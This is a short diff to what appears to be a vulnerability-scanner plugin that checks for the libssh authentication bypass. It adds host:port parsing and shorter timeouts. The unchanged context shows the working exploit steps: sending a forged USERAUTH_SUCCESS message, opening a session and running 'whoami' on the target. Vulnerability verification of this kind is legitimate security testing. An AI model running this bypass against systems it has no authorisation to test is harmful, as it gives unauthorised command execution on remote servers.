@@ -34,10 +34,15 @@ class libssh_bypass_auth_BaseVerify:
             if flag != -1:
                 host = host[:flag]
         else:
-            host = self.url
+            if self.url.find(":") >= 0:
+                host = self.url.split(":")[0]
+                port = int(self.url.split(":")[1])
+            else:
+                host = self.url
 
         try:
             sock = socket.socket()
+            sock.settimeout(6)
             sock.connect((host, port))
             message = paramiko.message.Message()
             transport = paramiko.transport.Transport(sock)
@@ -45,7 +50,7 @@ class libssh_bypass_auth_BaseVerify:
             message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
             transport._send_message(message)
             cprint("[*]发现"+host+":"+str(port)+" 版本:"+transport.remote_version, "green")
-            spawncmd = transport.open_session(timeout=10)
+            spawncmd = transport.open_session(timeout=6)
             spawncmd.exec_command("whoami")
             if spawncmd.recv_exit_status() == 0:
                 cprint("[+]存在libssh身份绕过漏洞...(高危)\tpayload: "+host+":"+str(port), "red")
